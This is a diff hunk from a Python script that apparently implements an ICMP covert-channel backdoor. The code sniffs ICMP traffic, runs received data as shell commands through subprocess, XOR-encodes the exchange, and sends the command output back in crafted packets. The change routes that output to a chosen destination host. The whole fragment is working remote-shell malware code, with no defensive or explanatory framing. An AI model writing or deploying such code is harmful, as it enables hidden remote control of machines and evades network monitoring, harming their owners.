@@ -56,11 +56,11 @@ def XOR(p):
                 buff += chr(ord(p[i]) ^ ord(xor[i % 4]))
         return buff
 
-def command_shell(data):
+def command_shell(data, dst):
 	value = ""
 	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
 	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	value = proc.stdout.read() + proc.stderr.read()
-	sendp(packet_builder(shell + value + prompt),verbose=0,iface=sys.argv[1])
+	sendp(packet_builder(shell + value + prompt, dst),verbose=0,iface=sys.argv[1])
 
 sniff(iface=sys.argv[1],filter="icmp",prn=action,store=1)
